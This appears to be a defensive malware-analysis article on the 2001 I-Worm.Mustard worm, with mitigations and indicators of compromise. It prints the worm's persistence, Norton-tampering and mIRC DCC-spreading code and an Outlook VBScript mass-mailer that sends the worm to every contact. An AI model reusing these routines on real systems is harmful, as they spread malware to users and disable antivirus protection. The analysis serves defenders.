# Dissecting I‑Worm.Mustard: An Assembly Worm with AV Tampering, mIRC, and VBS Email 🛠️🔍

## Disclaimer
This article is for educational purposes only. The code and techniques discussed should not be used for malicious purposes.

## Introduction
I‑Worm.Mustard (May 2001) is a compact Windows worm written in 32‑bit assembly that blends several early‑2000s techniques: legacy persistence via WIN.INI, mIRC auto‑send for peer‑to‑peer spreading, Outlook‑driven email propagation via a dropped VBScript, and rudimentary anti‑antivirus measures specifically targeting Norton AntiVirus. Rather than using exploits, the worm relies on permissive local automation and predictable paths, calling Win32 APIs directly to manipulate files, registry keys, and system behavior.

Understanding Mustard is instructive because it shows how a small native stub can orchestrate multiple social vectors and even attempt to weaken defenses by editing AV configuration files. The sample exposes deterministic file names (AVUpdate.exe, send.vbs), registry paths, and unique markers that defenders can monitor and triage effectively on legacy systems or in malware labs.

## Overview of the Malware 🐛
Mustard follows a two‑phase execution pattern keyed off a stored marker in the current user’s registry hive.

- First‑run marker: It creates `HKCU\Software\[PetiK]` and uses the disposition from `RegCreateKeyExA` to decide whether this is the first run or a repeat. On first run it installs persistence and attempts AV tampering; on subsequent runs it jumps directly to email propagation.
- Persistence: Copies itself to the Windows directory as `AVUpdate.exe` and sets `run=AVUpdate.exe` in `WIN.INI` under the `[windows]` section using `WritePrivateProfileStringA`.
- IRC propagation: Builds a small mIRC script block and deploys it as `script.ini` across common mIRC install paths (`C:\mirc`, `C:\mirc32`, and variants under Program Files), then deletes the temporary staging file `C:\Win.sys`.
- AV tampering (Norton specific): Tries to delete the `Norton Auto-Protect` value under `HKLM\...\Run` (disabling real‑time protection). If successful, it locates Norton’s install directory from `HKLM\Software\Symantec\InstalledApps` and appends a crafted byte pattern to `Exclude.dat` (notably including `*.vbs`), then flips the file to read‑only.
- Email propagation: Drops `C:\send.vbs` (hidden + read‑only) containing VBScript that automates Outlook to send the Windows copy (`AVUpdate.exe`) to contacts with the lure “AntiVirus Update,” executes it via `wscript`, waits, and deletes the script.
- User‑facing noise: Displays a reboot prompt message and forces a reboot (`ExitWindowsEx`). The sample intends to show a message on June 17th, but a field mix‑up makes the time‑based trigger unreachable.

The worm targets Windows 9x/ME/2000‑era systems where `WIN.INI` and mIRC were prevalent and Outlook automation was unconstrained. No C2 is present; spread relies entirely on social channels.

## Source Code Analysis 🔬
Key APIs are imported from KERNEL32 (file I/O, process control), ADVAPI32 (registry operations), and USER32 (message boxes, reboot). The control flow is linear, with labels guiding each stage.

### First‑run Registry Marker and Branch
```asm
; Create/Open HKCU\Software\[PetiK] and get disposition
push offset regDisp
push offset regResu
push 0
push 0F003Fh
push 0
push 0
push 0
push offset CLE                ; "Software\\[PetiK]"
push HKEY_CURRNET_USER         ; value defined as 0x80000001
call RegCreateKeyExA
push [regResu]
call RegCloseKey
cmp  [regDisp], 1               ; 1 = created new key (first run)
jne  EMAIL                      ; if not first run, jump to EMAIL stage
```
- Uses the disposition from `RegCreateKeyExA` to detect first run. Subsequent runs skip directly to email propagation. Note the mnemonic label misspelling (`HKEY_CURRNET_USER`), but the numeric value is correct.

### Persistence and mIRC Script Deployment
```asm
; Copy self to %WinDir%\AVUpdate.exe
GetModuleHandleA 0
GetModuleFileNameA eax, szOrig, 50
GetWindowsDirectoryA szCopie, 50
lstrcat szCopie, "\\AVUpdate.exe"
CopyFileA szOrig, szCopie, FALSE

; Write [windows] run= to WIN.INI
GetWindowsDirectoryA szWin, 50
lstrcat szWin, "\\WIN.INI"
WritePrivateProfileStringA "windows", "run", szCopie, szWin
```
- Classic `WIN.INI` persistence, still honored on vintage Windows lines. The destination name `AVUpdate.exe` is chosen to appear legitimate.

```asm
; Stage mIRC script in C:\Win.sys, then copy to multiple script.ini paths
CreateFileA "C:\\Win.sys", GENERIC_WRITE, FILE_SHARE_READ, ..., CREATE_ALWAYS, FILE_ATTRIBUTE_READONLY
WriteFile FileHandle, mircd, MIRCTAILLE
CloseHandle FileHandle
CopyFileA "C:\\Win.sys", "C:\\mirc\\script.ini", FALSE
CopyFileA "C:\\Win.sys", "C:\\mirc32\\script.ini", FALSE
CopyFileA "C:\\Win.sys", "C:\\Program Files\\mirc\\script.ini", FALSE
CopyFileA "C:\\Win.sys", "C:\\Program Files\\mirc32\\script.ini", FALSE
DeleteFileA "C:\\Win.sys"
```
- The embedded mIRC script (`mircd`) contains a JOIN hook that silently DCC‑sends the worm to newcomers:
```asm
mircd:
  db "[script]",0Dh,0Ah
  db "n0=on 1:JOIN:#:{",0Dh,0Ah
  db "n1= /if ( $nick == $me ) { halt }",0Dh,0Ah
  db "n2= ./dcc send $nick "
  szCopie db 50 dup(0)    ; buffer later holding %WinDir%\AVUpdate.exe
  db "",0Dh,0Ah
  db "n3=}",0
```
- The `.` prefix in `./dcc` invokes a silent command in mIRC; `szCopie` is filled earlier with the AVUpdate path.

### Norton AV Tampering and Exclusion File Edit
```asm
; Delete HKLM\...\Run\"Norton Auto-Protect"
RegOpenKeyExA HKLM, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS, &RegHandle
RegDeleteValueA RegHandle, "Norton Auto-Protect"
jnz EMAIL                         ; if deletion failed, skip AV tamper flow
RegCloseKey RegHandle

; Locate Symantec InstalledApps and query "NAV" (install dir)
RegOpenKeyExA HKLM, "\\Software\\Symantec\\InstalledApps", 0, 001F0000h, &RegHandle
jnz FIN
RegQueryValueExA RegHandle, "NAV", 0, &ValueType, &Buffer, &BufferSize
RegCloseKey RegHandle

; Append "\\Exclude.dat" and write bytes (incl. "*.vbs"), then set read-only
lstrcat Buffer, "\\Exclude.dat"
GetFileAttributesA Buffer
cmp eax, FILE_ATTRIBUTE_READONLY
je  FIN
CreateFileA Buffer, GENERIC_WRITE, FILE_SHARE_READ, ..., OPEN_EXISTING, ...
SetFilePointer FileHandle, [Dist], 0, FILE_END
WriteFile FileHandle, datd, DATTAILLE
CloseHandle FileHandle
Sleep 5000
SetFileAttributesA Buffer, FILE_ATTRIBUTE_READONLY
```
- If NAV is present and unprotected, the code appends a static pattern (`datd`) to `Exclude.dat`. The first bytes translate to `*.vbs`, effectively excluding VBScript files from scanning. Setting the file read‑only can inhibit user corrections.

### Dropped VBScript Emailer and Cleanup
```asm
; Create hidden+read-only C:\send.vbs, write emailer, run it, delay, then delete
CreateFileA "C:\\send.vbs", GENERIC_WRITE, FILE_SHARE_READ, ..., CREATE_NEW, FILE_ATTRIBUTE_HIDDEN or FILE_ATTRIBUTE_READONLY
WriteFile FileHandle, sendd, SENDTAILLE
CloseHandle FileHandle
WinExec "wscript C:\\send.vbs", SW_SHOWNORMAL
Sleep 10000
DeleteFileA "C:\\send.vbs"
```
- The embedded `sendd` script automates Outlook:
```vb
' send.vbs (excerpt – inert for analysis)
Sub EMAIL()
  Set K = CreateObject("Outlook.Application")
  Set L = K.GetNameSpace("MAPI")
  For Each M In L.AddressLists
    If M.AddressEntries.Count <> 0 Then
      For O = 1 To M.AddressEntries.Count
        Set P = M.AddressEntries(O)
        Set N = K.CreateItem(0)
        N.To = P.Address
        N.Subject = "AntiVirus Update"
        N.Body = "The last version of your AV"
        Set Q = CreateObject("Scripting.FileSystemObject")
        N.Attachments.Add Q.BuildPath(Q.GetSpecialFolder(0), "AVUpdate.exe")
        N.DeleteAfterSubmit = True
        If N.To <> "" Then N.Send
      Next
    End If
  Next
End Sub
```
- This targets every address entry, attaches the Windows copy, and deletes sent items post‑submit to reduce evidence.

### User Messaging and Reboot; Date Bug
```asm
MessageBoxA 0, "Please reboot your computer to finish the installation", "Install Information", 0x40
ExitWindowsEx EWX_REBOOT or EWX_FORCE

GetSystemTime &SystemTime
cmp [SystemTime.wDay], 11h        ; 17th
jne FIN
cmp [SystemTime.wDay], 06h        ; intended to be month, but checks wDay again
jne FIN
MessageBoxA 0, "...Coded By PetiK...", "I-Worm.Mustard", 0x40
```
- The forced reboot aids persistence take‑effect and clears UI. The time check mistakenly compares `wDay` twice; the second comparison should have been `wMonth == 06h` to implement “June 17th.” As written, the final message box is never reached.

## Mitigation and Defense Strategies 🛡️
- Script and automation control: Disable or restrict Windows Script Host (wscript.exe/cscript.exe) for standard users via AppLocker/WDAC. Enforce prompts/blocks on Outlook Object Model automation to prevent silent mass‑mailing.
- Legacy persistence hygiene: Monitor and remediate `WIN.INI` `[windows] run=` entries, especially paths to `%WinDir%\AVUpdate.exe`. Prefer policy baselines for legacy autoruns and alert on deviations.
- mIRC hardening: If IRC is allowed, block auto‑DCC at the client or network edge. Watch for creation/modification of `script.ini` in `C:\mirc*` paths and content containing `ON 1:JOIN` with `/dcc send`.
- AV tamper protection: Ensure antivirus has tamper‑protection enabled to block registry value deletions (e.g., `Norton Auto-Protect`) and unauthorized writes to configuration files like `Exclude.dat`. File integrity monitoring should alert on changes to `Exclude.dat` and attribute flips to read‑only.
- IOC hunts: Look for `C:\send.vbs` (especially hidden/read‑only), `%WinDir%\AVUpdate.exe`, `C:\Win.sys`, and the registry marker `HKCU\Software\[PetiK]`. Search `Exclude.dat` for appended `*.vbs` patterns following anomalous bytes. Review forced reboot events (`ExitWindowsEx`) from untrusted processes.
- EDR detections: Correlate sequences of `CopyFileA` into the Windows directory, followed by `WritePrivateProfileStringA` to WIN.INI, mIRC `script.ini` creation, and a `WinExec` launching `wscript` on a dropped VBS.
- Least privilege: Running as a standard user limits the worm’s ability to write to `HKLM` Run keys, program directories, and AV configuration files, reducing impact.

## Conclusion
I‑Worm.Mustard showcases a compact yet multi‑faceted infection chain: legacy autorun persistence, mIRC‑based lateral spread, Outlook mass mailing via a dropped VBScript, and targeted tampering of Norton AntiVirus exclusions. Its operations are noisy and deterministic—with specific file names, paths, and registry keys—making it feasible to detect and remediate even on aging Windows systems. Modern environments can largely neutralize this class of threat by hardening script execution, constraining client automation, enforcing AV tamper protections, and watching for tell‑tale artifact chains. For historical analysis and defense in depth, Mustard remains a useful blueprint of early worm tactics and where to break the kill chain.
